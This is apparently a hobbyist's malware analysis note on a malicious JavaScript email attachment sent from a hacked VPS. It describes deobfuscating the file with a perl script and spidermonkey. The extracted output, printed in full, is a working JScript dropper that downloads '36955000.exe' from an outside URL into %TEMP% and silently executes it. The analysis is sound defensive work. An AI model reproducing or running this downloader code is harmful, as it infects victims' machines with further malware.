00864587
=

I got this one attached to a mail from (presumed) "Contry Court".
From the headers, we can assume that this mail was sent from a hacked VPS.
Obviously, I came from a hacked VPS "www-data@vps901.getcadre.com" using php eval()'d code

```
Received-SPF: none (google.com: www-data@vps901.getcadre.com does not designate permitted sender hosts)
X-PHP-Originating-Script: 2000:post.php(1) : eval()'d code
```

Anyway, this gives us a *.js* file, and spidermonkey returned me error because "ActiveXObject" was not defined.
Since I wanted to understand what the code was actually doing, I built a perl script to retrieve the successive calls to the function inside the javascript file.

In the end, the script gave me the built command:
```
$ perl extract.pl 
unmatch "  this[d] (c);" in jir
Entry point is qk() :
c = function dl(fr,fn,rn) { var ws = new ActiveXObject("WScript.Shell"); var fn = ws.ExpandEnvironmentStrings("%TEMP%")+String.fromCharCode(92)+fn; var xo = new ActiveXObject("MSXML2.XMLHTTP"); xo.onreadystatechange = function() { if (xo.readyState === 4) { var xa = new ActiveXObject("ADODB.Stream"); xa.open(); xa.type = 1; xa.write(xo.ResponseBody); xa.position = 0; xa.saveToFile(fn,2); xa.close(); }; }; try { xo.open("GET",fr,false); xo.send(); if (rn > 0) { ws.Run(fn,0,0); }; } catch (er) { }; }; dl("http://guilfordgourmetclub.org/document.php?id=5453525E160B0B10240805111016014A0A0110&rnd=1074861","36955000.exe",1);
```

The call to `this[d](c)` actually triggers the function, which would probably download some other malware "36955000.exe". 

And after one hour or so, I just replaced `this[d]` by `print` and ran *spidermonkey* which gave me the same function at once.

Todo
-

Now I suppose I should dig into *vps901.getcadre.com*, *guilfordgourmetclub.org* (which seems to annoy my firefox), and *36955000.exe*. But this will be for another night. 
